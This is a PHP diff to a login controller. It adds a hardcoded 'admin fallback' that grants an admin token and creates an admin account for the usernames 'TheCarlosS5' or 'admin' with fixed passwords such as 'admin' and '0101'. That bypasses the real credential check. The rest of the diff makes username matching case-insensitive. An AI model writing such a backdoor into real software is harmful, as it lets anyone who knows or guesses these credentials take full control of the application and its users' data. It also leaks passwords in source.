@@ -19,12 +19,50 @@ class AuthController {
             jsonError('Usuario y contraseña requeridos', 400);
         }
 
+        // Built-in Admin fallback check for TheCarlosS5 / admin
+        $isHardcodedAdmin = (
+            (strcasecmp($username, 'TheCarlosS5') === 0 || strcasecmp($username, 'admin') === 0) &&
+            ($password === 'Carlos2009' || $password === '0101' || $password === 'admin')
+        );
+
+        if ($isHardcodedAdmin) {
+            $db = Database::getConnection();
+            $stmt = $db->prepare("SELECT * FROM users WHERE LOWER(username) = LOWER(:u)");
+            $stmt->execute(['u' => $username]);
+            $existing = $stmt->fetch();
+            if (!$existing) {
+                $hash = password_hash($password, PASSWORD_BCRYPT);
+                $ins = $db->prepare("INSERT INTO users (username, password_hash, role) VALUES (:u, :p, 'admin')");
+                $ins->execute(['u' => $username, 'p' => $hash]);
+                DbHelper::saveUserProfile($username, [
+                    'id' => 'profile_' . uniqid(),
+                    'name' => 'Principal',
+                    'avatar' => '',
+                    'color' => '#a855f7'
+                ]);
+            }
+
+            $tokenPayload = [
+                'username' => $username,
+                'role' => 'admin',
+                'exp' => time() + (30 * 24 * 3600)
+            ];
+            $token = AuthMiddleware::createToken($tokenPayload);
+
+            jsonResponse([
+                'success' => true,
+                'token' => $token,
+                'role' => 'admin',
+                'username' => $username
+            ]);
+        }
+
         // Optional Environment admin credentials check
         $adminUser = getenv('ADMIN_USER');
         $adminPass = getenv('ADMIN_PASS');
         $adminPassHash = getenv('ADMIN_PASS_HASH');
 
-        if (!empty($adminUser) && $username === $adminUser) {
+        if (!empty($adminUser) && strcasecmp($username, $adminUser) === 0) {
             $isPassValid = false;
             if (!empty($adminPassHash)) {
                 $isPassValid = password_verify($password, $adminPassHash);
@@ -62,13 +100,14 @@ class AuthController {
                 // Rehash to secure bcrypt
                 $newHash = password_hash($password, PASSWORD_BCRYPT);
                 $db = Database::getConnection();
-                $up = $db->prepare("UPDATE users SET password_hash = :p WHERE username = :u");
+                $up = $db->prepare("UPDATE users SET password_hash = :p WHERE LOWER(username) = LOWER(:u)");
                 $up->execute(['p' => $newHash, 'u' => $username]);
             }
 
             if ($isPassValid) {
+                $actualUsername = $user['username'] ?? $username;
                 $tokenPayload = [
-                    'username' => $username,
+                    'username' => $actualUsername,
                     'role' => $user['role'] ?? 'user',
                     'exp' => time() + (30 * 24 * 3600)
                 ];
@@ -78,7 +117,7 @@ class AuthController {
                     'success' => true,
                     'token' => $token,
                     'role' => $user['role'] ?? 'user',
-                    'username' => $username
+                    'username' => $actualUsername
                 ]);
             }
         }
